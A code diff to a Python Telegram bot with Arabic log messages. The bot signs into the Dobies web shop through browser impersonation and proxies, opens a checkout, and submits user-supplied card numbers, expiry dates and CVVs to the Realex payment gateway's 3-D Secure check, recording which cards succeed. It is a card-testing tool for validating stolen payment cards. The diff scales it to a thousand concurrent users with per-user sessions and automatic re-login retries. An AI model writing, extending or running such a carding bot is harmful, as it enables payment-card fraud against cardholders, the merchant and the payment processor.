@@ -38,9 +38,10 @@ LOGIN_EMAIL = os.getenv("LOGIN_EMAIL", "")
 LOGIN_PASSWORD = os.getenv("LOGIN_PASSWORD", "")
 PROXY_URL = os.getenv("PROXY_URL", "").strip()
 IMPERSONATE = os.getenv("CURL_IMPERSONATE", "chrome120")
-HTTP_WORKERS = max(10, min(60, int(os.getenv("HTTP_WORKERS", "40"))))
-MAX_REALEX_PARALLEL = max(5, min(30, int(os.getenv("MAX_REALEX_PARALLEL", "15"))))
-MAX_ACTIVE_USERS = max(10, min(100, int(os.getenv("MAX_ACTIVE_USERS", "50"))))
+HTTP_WORKERS = max(20, min(150, int(os.getenv("HTTP_WORKERS", "80"))))
+MAX_REALEX_PARALLEL = max(10, min(50, int(os.getenv("MAX_REALEX_PARALLEL", "25"))))
+MAX_ACTIVE_USERS = max(50, min(2000, int(os.getenv("MAX_ACTIVE_USERS", "1000"))))
+SESSION_MAX_RETRIES = max(5, min(30, int(os.getenv("SESSION_MAX_RETRIES", "15"))))
 DASH_UPDATE_INTERVAL = 2.0
 
 LOGGED_IN_MARKERS = (
@@ -80,15 +81,25 @@ BASE_HEADERS = {
     "X-Requested-With": "XMLHttpRequest",
 }
 
-# ========== SESSION ==========
-dobies_session = None
+# ========== SESSION (per user) ==========
 user_sessions: dict = {}
+_user_dobies: dict = {}
+_user_async_locks: dict = {}
 _http_executor: ThreadPoolExecutor | None = None
-_session_thread_lock = threading.Lock()
-_login_async_lock: asyncio.Lock | None = None
-_guid_async_lock: asyncio.Lock | None = None
 _realex_semaphore: asyncio.Semaphore | None = None
-_guid_waiters = 0
+_registry_lock = threading.Lock()
+
+
+class UserDobiesCtx:
+    __slots__ = ("user_id", "http", "thread_lock", "valid", "guid", "failures")
+
+    def __init__(self, user_id: int):
+        self.user_id = user_id
+        self.http: curl_requests.Session | None = None
+        self.thread_lock = threading.Lock()
+        self.valid = False
+        self.guid: str | None = None
+        self.failures = 0
 
 
 def _get_executor() -> ThreadPoolExecutor:
@@ -98,25 +109,24 @@ def _get_executor() -> ThreadPoolExecutor:
     return _http_executor
 
 
-def _get_login_lock() -> asyncio.Lock:
-    global _login_async_lock
-    if _login_async_lock is None:
-        _login_async_lock = asyncio.Lock()
-    return _login_async_lock
-
-
-def _get_guid_lock() -> asyncio.Lock:
-    global _guid_async_lock
-    if _guid_async_lock is None:
-        _guid_async_lock = asyncio.Lock()
-    return _guid_async_lock
-
-
 def _get_realex_sem() -> asyncio.Semaphore:
     global _realex_semaphore
     if _realex_semaphore is None:
         _realex_semaphore = asyncio.Semaphore(MAX_REALEX_PARALLEL)
     return _realex_semaphore
+
+
+def _get_user_async_lock(user_id: int) -> asyncio.Lock:
+    if user_id not in _user_async_locks:
+        _user_async_locks[user_id] = asyncio.Lock()
+    return _user_async_locks[user_id]
+
+
+def _get_dobies_ctx(user_id: int) -> UserDobiesCtx:
+    with _registry_lock:
+        if user_id not in _user_dobies:
+            _user_dobies[user_id] = UserDobiesCtx(user_id)
+        return _user_dobies[user_id]
 
 
 def count_active_checks() -> int:
@@ -248,6 +258,8 @@ def get_user_stats(user_id: int) -> dict:
             "dashboard_message_id": None,
             "chat_id": None,
             "current_card": "",
+            "active_card": "",
+            "check_seq": 0,
             "last_response": "waiting",
             "cards_checked": 0,
             "success_cards": [],
@@ -266,6 +278,8 @@ def reset_user_stats(user_id: int) -> None:
             "start_time": None,
             "is_running": False,
             "current_card": "",
+            "active_card": "",
+            "check_seq": 0,
             "last_response": "waiting",
             "cards_checked": 0,
             "success_cards": [],
@@ -380,111 +394,138 @@ def _verify_account(session: curl_requests.Session, sign_in_url: str) -> tuple[b
     return False, f"status={account.status_code} snippet={snippet}"
 
 
-def _do_login_unlocked() -> bool:
-    global dobies_session
+def _login_ctx(ctx: UserDobiesCtx) -> bool:
     if not LOGIN_EMAIL or not LOGIN_PASSWORD:
         log.error("LOGIN_EMAIL أو LOGIN_PASSWORD غير مضبوطين")
         return False
 
-    log.info("تسجيل دخول Dobies... (proxy=%s)", "yes" if PROXY_URL else "no")
-    session = _new_session()
-    sign_in_url = f"{DOBIES_BASE}/sign-in"
-    post_hdrs = {
-        **_browser_headers(sign_in_url),
-        "content-type": "application/x-www-form-urlencoded",
-        "origin": DOBIES_BASE,
-    }
-    creds = {"EmailAddress": LOGIN_EMAIL, "Password": LOGIN_PASSWORD}
+    with ctx.thread_lock:
+        ctx.http = None
+        ctx.valid = False
+        ctx.guid = None
 
-    try:
-        session.get(DOBIES_BASE + "/", headers=_browser_headers(), timeout=30)
-        time.sleep(0.8)
-        sign_in_page = session.get(sign_in_url, headers=_browser_headers(DOBIES_BASE + "/"), timeout=30)
-        time.sleep(0.5)
+        session = _new_session()
+        sign_in_url = f"{DOBIES_BASE}/sign-in"
+        post_hdrs = {
+            **_browser_headers(sign_in_url),
+            "content-type": "application/x-www-form-urlencoded",
+            "origin": DOBIES_BASE,
+        }
+        creds = {"EmailAddress": LOGIN_EMAIL, "Password": LOGIN_PASSWORD}
 
-        if sign_in_page.status_code >= 400:
-            log.error("sign-in page HTTP %s", sign_in_page.status_code)
+        try:
+            session.get(DOBIES_BASE + "/", headers=_browser_headers(), timeout=30)
+            time.sleep(0.6)
+            sign_in_page = session.get(sign_in_url, headers=_browser_headers(DOBIES_BASE + "/"), timeout=30)
+            time.sleep(0.4)
+
+            if sign_in_page.status_code >= 400:
+                log.error("user %s sign-in HTTP %s", ctx.user_id, sign_in_page.status_code)
+                return False
+
+            session.post(sign_in_url, headers=post_hdrs, data=creds, allow_redirects=True, timeout=30)
+            time.sleep(0.6)
+            ok, detail = _verify_account(session, sign_in_url)
+
+            if not ok:
+                hidden = _parse_hidden_fields(sign_in_page.text)
+                if hidden:
+                    hidden.update(creds)
+                    session.post(sign_in_url, headers=post_hdrs, data=hidden, allow_redirects=True, timeout=30)
+                    time.sleep(0.6)
+                    ok, detail = _verify_account(session, sign_in_url)
+
+            if not ok:
+                log.error("user %s login fail — %s", ctx.user_id, detail)
+                return False
+
+            _add_cart_item(session)
+            guid = _fetch_checkout_guid(session)
+            if not guid:
+                log.error("user %s login OK but no GUID", ctx.user_id)
+                return False
+
+            ctx.http = session
+            ctx.guid = guid
+            ctx.valid = True
+            ctx.failures = 0
+            log.info("user %s session OK — guid=%s...", ctx.user_id, guid[:8])
+            return True
+
+        except Exception as exc:
+            log.exception("user %s login error: %s", ctx.user_id, exc)
             return False
 
-        session.post(sign_in_url, headers=post_hdrs, data=creds, allow_redirects=True, timeout=30)
-        time.sleep(0.8)
-        ok, detail = _verify_account(session, sign_in_url)
 
-        if not ok:
-            hidden = _parse_hidden_fields(sign_in_page.text)
-            if hidden:
-                hidden.update(creds)
-                session.post(sign_in_url, headers=post_hdrs, data=hidden, allow_redirects=True, timeout=30)
-                time.sleep(0.8)
-                ok, detail = _verify_account(session, sign_in_url)
-
-        if not ok:
-            log.error("فشل تسجيل الدخول — %s", detail)
-            if "captcha" in detail:
-                log.error("Railway IP محظور — شغّل محلياً أو استخدم PROXY_URL")
+def _validate_ctx(ctx: UserDobiesCtx) -> bool:
+    with ctx.thread_lock:
+        if ctx.http is None:
             return False
-
-        log.info("إضافة منتج للسلة...")
-        _add_cart_item(session)
-        dobies_session = session
-        log.info("تسجيل الدخول ناجح — cookies=%d", len(session.cookies))
+        sign_in_url = f"{DOBIES_BASE}/sign-in"
+        ok, _ = _verify_account(ctx.http, sign_in_url)
+        if not ok:
+            ctx.valid = False
+            ctx.guid = None
+            return False
+        guid = _fetch_checkout_guid(ctx.http)
+        if not guid:
+            ctx.valid = False
+            ctx.guid = None
+            return False
+        ctx.guid = guid
+        ctx.valid = True
         return True
 
-    except Exception as exc:
-        log.exception("خطأ في اللوجين: %s", exc)
-        return False
+
+def invalidate_user_session(user_id: int) -> None:
+    ctx = _get_dobies_ctx(user_id)
+    with ctx.thread_lock:
+        ctx.valid = False
+        ctx.guid = None
+        ctx.http = None
+        ctx.failures += 1
 
 
-def do_login() -> bool:
-    with _session_thread_lock:
-        return _do_login_unlocked()
+async def get_user_guid(user_id: int, stats: dict) -> str | None:
+    async with _get_user_async_lock(user_id):
+        ctx = _get_dobies_ctx(user_id)
+        if ctx.valid and ctx.guid and await run_blocking(_validate_ctx, ctx):
+            return ctx.guid
+
+        invalidate_user_session(user_id)
+        if await _ensure_user_session_unlocked(user_id, stats):
+            return _get_dobies_ctx(user_id).guid
+        return None
 
 
-def ensure_session() -> curl_requests.Session | None:
-    with _session_thread_lock:
-        if dobies_session is None and not _do_login_unlocked():
-            return None
-        return dobies_session
+async def _ensure_user_session_unlocked(user_id: int, stats: dict) -> bool:
+    """بدون lock — للاستخدام الداخلي فقط."""
+    for attempt in range(SESSION_MAX_RETRIES):
+        if not stats.get("is_running", True):
+            return False
+        stats["last_response"] = f"session_retry:{attempt + 1}"
+        ctx = _get_dobies_ctx(user_id)
+
+        if await run_blocking(_validate_ctx, ctx):
+            return True
+
+        invalidate_user_session(user_id)
+        if await run_blocking(_login_ctx, _get_dobies_ctx(user_id)):
+            return True
+
+        log.warning("user %s session retry %d/%d", user_id, attempt + 1, SESSION_MAX_RETRIES)
+        await asyncio.sleep(1.0 + attempt * 0.4)
+
+    return False
 
 
-def invalidate_session() -> None:
-    global dobies_session
-    with _session_thread_lock:
-        dobies_session = None
-
-
-async def async_do_login() -> bool:
-    async with _get_login_lock():
-        return await run_blocking(do_login)
-
-
-async def get_guid_with_retry(stats: dict, max_retries: int = 3) -> str | None:
-    global _guid_waiters
-    for attempt in range(max_retries):
-        async with _get_guid_lock():
-            _guid_waiters += 1
-            try:
-                session = await run_blocking(ensure_session)
-                if not session:
-                    stats["last_response"] = f"guid_retry:{attempt + 1}"
-                    continue
-                guid = await run_blocking(_fetch_checkout_guid, session)
-                if guid:
-                    return guid
-                invalidate_session()
-            finally:
-                _guid_waiters -= 1
-
-        log.warning("فشل GUID — محاولة %d/%d (نشط: %d)", attempt + 1, max_retries, count_active_checks())
-        stats["last_response"] = f"guid_retry:{attempt + 1}"
-        await async_do_login()
-        await asyncio.sleep(1.5 + attempt)
-
-    return None
+async def ensure_user_session(user_id: int, stats: dict) -> bool:
+    async with _get_user_async_lock(user_id):
+        return await _ensure_user_session_unlocked(user_id, stats)
 
 
 # ========== CARD CHECKER ==========
-async def check_card(card: str, bot_app, user_id: int) -> tuple[str, str]:
+async def check_card(card: str, bot_app, user_id: int, check_seq: int) -> tuple[str, str]:
     stats = get_user_stats(user_id)
     if not stats["is_running"]:
         return card, "STOPPED"
@@ -497,13 +538,19 @@ async def check_card(card: str, bot_app, user_id: int) -> tuple[str, str]:
     cc, mm, yy, cvv = parts
     yy2 = yy[-2:]
     mmyy = f"{mm}/{yy2}"
+
+    if not stats["is_running"] or stats.get("check_seq") != check_seq:
+        return card, "STOPPED"
+
+    stats["active_card"] = card
     stats["current_card"] = mask_card(card)
 
     try:
-        guid = await get_guid_with_retry(stats)
-        if not guid:
+        guid = await get_user_guid(user_id, stats)
+        if not guid or stats.get("check_seq") != check_seq:
             stats["errors"] += 1
             stats["last_response"] = "guid_error"
+            invalidate_user_session(user_id)
             return card, "ERROR"
 
         referer = f"{REALEX_BASE}/card.html?guid={guid}"
@@ -539,6 +586,10 @@ async def check_card(card: str, bot_app, user_id: int) -> tuple[str, str]:
 
         async with _get_realex_sem():
             resp_auth = await run_blocking(_run_realex)
+
+        if stats.get("check_seq") != check_seq:
+            return card, "STOPPED"
+
         data = resp_auth.json()
 
         encoded_creq = (data.get("data") or {}).get("verifyEnrolledResult") or {}
@@ -558,7 +609,11 @@ async def check_card(card: str, bot_app, user_id: int) -> tuple[str, str]:
     except Exception as exc:
         stats["errors"] += 1
         stats["last_response"] = f"error:{str(exc)[:35]}"
+        invalidate_user_session(user_id)
         return card, "ERROR"
+    finally:
+        if stats.get("check_seq") == check_seq:
+            stats["active_card"] = ""
 
 
 async def send_result(bot_app, card: str, status_type: str, user_id: int) -> None:
@@ -749,17 +804,47 @@ def limit_cards(cards: list[str], user_id: int) -> tuple[list[str], int]:
 async def process_cards(cards: list[str], bot_app, user_id: int) -> None:
     stats = get_user_stats(user_id)
 
+    stats["last_response"] = "session_retry:0"
+    await update_dashboard(bot_app, user_id, force=True)
+    if not await ensure_user_session(user_id, stats):
+        stats["is_running"] = False
+        stats["last_response"] = "guid_error"
+        await update_dashboard(bot_app, user_id, force=True)
+        await bot_app.bot.send_message(
+            chat_id=stats["chat_id"],
+            text=i18n.t(user_id, "session_failed"),
+            parse_mode="Markdown",
+        )
+        return
+
     for card in cards:
         if not stats["is_running"]:
             break
 
+        stats["check_seq"] += 1
+        seq = stats["check_seq"]
         stats["current_card"] = mask_card(card)
+        stats["active_card"] = card
         stats["checking"] = 1
+        stats["last_response"] = "running"
         await update_dashboard(bot_app, user_id, force=True)
-        await check_card(card, bot_app, user_id)
+
+        result = await check_card(card, bot_app, user_id, seq)
+
+        if result[1] == "ERROR" and stats["is_running"]:
+            invalidate_user_session(user_id)
+            if await ensure_user_session(user_id, stats):
+                stats["check_seq"] += 1
+                retry_seq = stats["check_seq"]
+                stats["current_card"] = mask_card(card)
+                stats["active_card"] = card
+                result = await check_card(card, bot_app, user_id, retry_seq)
+
         stats["cards_checked"] += 1
         stats["checking"] = 0
-        stats["current_card"] = ""
+        if stats.get("check_seq") == seq:
+            stats["current_card"] = ""
+            stats["active_card"] = ""
         await update_dashboard(bot_app, user_id)
 
         if stats["is_running"] and stats["cards_checked"] < stats["total"]:
@@ -932,8 +1017,9 @@ async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 async def reload_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     uid = update.effective_user.id
     msg = await update.message.reply_text(i18n.t(uid, "reloading"))
-    invalidate_session()
-    ok = await async_do_login()
+    invalidate_user_session(uid)
+    stats = get_user_stats(uid)
+    ok = await ensure_user_session(uid, stats)
     text = i18n.t(uid, "reload_ok") if ok else i18n.t(uid, "reload_fail")
     await msg.edit_text(text)
 
@@ -1076,8 +1162,9 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
 
     if data == "reload_session":
         await query.answer(i18n.t(user_id, "reloading_short"))
-        invalidate_session()
-        ok = await async_do_login()
+        invalidate_user_session(user_id)
+        stats = get_user_stats(user_id)
+        ok = await ensure_user_session(user_id, stats)
         await query.message.reply_text(
             i18n.t(user_id, "reload_ok") if ok else i18n.t(user_id, "reload_fail")
         )
@@ -1134,10 +1221,6 @@ def main() -> None:
     db.init_db()
     log.info("الأدمن: %s", admin_panel.ADMIN_IDS)
 
-    log.info("جاري تسجيل الدخول الأولي...")
-    if not do_login():
-        log.warning("فشل اللوجين الأولي — سيُعاد المحاولة أثناء الفحص")
-
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("help", help_cmd))
@@ -1151,7 +1234,7 @@ def main() -> None:
     app.add_handler(CallbackQueryHandler(button_callback))
 
     log.info(
-        "البوت شغال — حتى %d مستخدم | %d realex متوازي | %d workers",
+        "البوت شغال — جلسة/مستخدم | حتى %d | %d realex | %d workers",
         MAX_ACTIVE_USERS, MAX_REALEX_PARALLEL, HTTP_WORKERS,
     )
     app.run_polling(allowed_updates=Update.ALL_TYPES)
